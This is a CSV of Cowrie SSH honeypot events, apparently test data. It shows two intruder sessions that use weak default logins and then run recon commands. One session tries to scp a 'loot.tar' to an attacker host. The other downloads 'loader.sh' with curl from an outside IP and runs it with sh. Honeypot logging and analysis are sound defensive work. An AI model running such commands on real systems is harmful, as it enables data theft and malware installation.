eventid,message,sensor,uuid,timestamp,src_ip,src_port,dst_ip,dst_port,session,protocol,_source_file,version,username,password,input,ttylog,size,shasum,duplicate,duration,url,outfile,fingerprint,filename,destfile,command,is_command_input,is_command_failed,is_login_success,is_login_failed,is_session_closed,is_log_closed,is_file_download,is_file_upload
cowrie.client.version,Remote SSH version: SSH-2.0-PUTTY,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:30.400000+00:00,66.240.219.146,,10.0.0.5,2222.0,5e7f9d0aa131,ssh,cowrieTEST.json,SSH-2.0-PUTTY,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.success,login attempt [backup/backup] succeeded,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:31.900000+00:00,66.240.219.146,,10.0.0.5,2222.0,5e7f9d0aa131,ssh,cowrieTEST.json,,backup,backup,,,,,,,,,,,,,0,0,1,0,0,0,0,0
cowrie.command.input,CMD: ls -la,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:32.500000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,ls -la,,,,,,,,,,,ls -la,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: cat /proc/cpuinfo,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:33.200000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,cat /proc/cpuinfo,,,,,,,,,,,cat /proc/cpuinfo,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: touch scan.txt,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:34+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,touch scan.txt,,,,,,,,,,,touch scan.txt,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:35.200000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,,,,,,,,,,,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,1,0,0,0,0,0,0,0
cowrie.command.failed,Command not found: scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:35.300000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,,,,,,,,,,,scp loot.tar attacker@198.51.100.77:/tmp/loot.tar,0,1,0,0,0,0,0,0
cowrie.session.file_upload,Uploaded file loot.tar to var/lib/cowrie/uploads/5e7f9d0aa131_loot.tar,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:36.100000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,,,,eccbc87e4b5ce2fe28308fd9f2a7baf3,,,,var/lib/cowrie/uploads/5e7f9d0aa131_loot.tar,,loot.tar,,,0,0,0,0,0,0,0,1
cowrie.log.closed,Closing TTY Log: var/lib/cowrie/tty/5e7f9d0aa131.log after 7.4 seconds,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:37.600000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,,var/lib/cowrie/tty/5e7f9d0aa131.log,876.0,c81e728d9d4c2f636f067f89cc14862c,False,7.4,,,,,,,0,0,0,0,0,1,0,0
cowrie.session.closed,Connection lost after 7.8 seconds,PC4Me,bc44cd90-1649-11f1-8bf4-00155d923fee,2026-03-04 14:40:37.900000+00:00,66.240.219.146,,,,5e7f9d0aa131,ssh,cowrieTEST.json,,,,,,,,,7.8,,,,,,,0,0,0,0,1,0,0,0
cowrie.session.connect,New connection: 89.248.172.16:60122 (10.0.0.5:2222),PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:50+00:00,89.248.172.16,60122.0,10.0.0.5,2222.0,884fca7720be,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-libssh2_1.9.0,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:50.400000+00:00,89.248.172.16,,10.0.0.5,2222.0,884fca7720be,ssh,cowrieTEST.json,SSH-2.0-libssh2_1.9.0,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [mysql/mysql] failed,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:51.300000+00:00,89.248.172.16,,10.0.0.5,2222.0,884fca7720be,ssh,cowrieTEST.json,,mysql,mysql,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [postgres/postgres] failed,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:52.100000+00:00,89.248.172.16,,10.0.0.5,2222.0,884fca7720be,ssh,cowrieTEST.json,,postgres,postgres,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.success,login attempt [dev/dev] succeeded,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:53+00:00,89.248.172.16,,10.0.0.5,2222.0,884fca7720be,ssh,cowrieTEST.json,,dev,dev,,,,,,,,,,,,,0,0,1,0,0,0,0,0
cowrie.command.input,CMD: whoami,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:54+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,whoami,,,,,,,,,,,whoami,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: curl http://198.51.100.88/loader.sh,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:55.200000+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,curl http://198.51.100.88/loader.sh,,,,,,,,,,,curl http://198.51.100.88/loader.sh,1,0,0,0,0,0,0,0
cowrie.session.file_download,Saved http://198.51.100.88/loader.sh to var/lib/cowrie/downloads/45c48cce2e2d7fbdea1afc51c7c6ad26,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:56+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,,,,45c48cce2e2d7fbdea1afc51c7c6ad26,,,http://198.51.100.88/loader.sh,var/lib/cowrie/downloads/45c48cce2e2d7fbdea1afc51c7c6ad26,,,,,0,0,0,0,0,0,1,0
cowrie.command.input,CMD: sh loader.sh,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:56.800000+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,sh loader.sh,,,,,,,,,,,sh loader.sh,1,0,0,0,0,0,0,0
cowrie.command.failed,Command not found: sh loader.sh,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:56.900000+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,sh loader.sh,,,,,,,,,,,sh loader.sh,0,1,0,0,0,0,0,0
cowrie.command.input,CMD: exit,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:57.600000+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,exit,,,,,,,,,,,exit,1,0,0,0,0,0,0,0
cowrie.log.closed,Closing TTY Log: var/lib/cowrie/tty/884fca7720be.log after 7.1 seconds,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:58+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,,var/lib/cowrie/tty/884fca7720be.log,744.0,d3d9446802a44259755d38e6d163e820,False,7.1,,,,,,,0,0,0,0,0,1,0,0
cowrie.session.closed,Connection lost after 8.0 seconds,PC4Me,cd55de01-1649-11f1-8bf4-00155d923fee,2026-03-04 14:55:58.100000+00:00,89.248.172.16,,,,884fca7720be,ssh,cowrieTEST.json,,,,,,,,,8.0,,,,,,,0,0,0,0,1,0,0,0
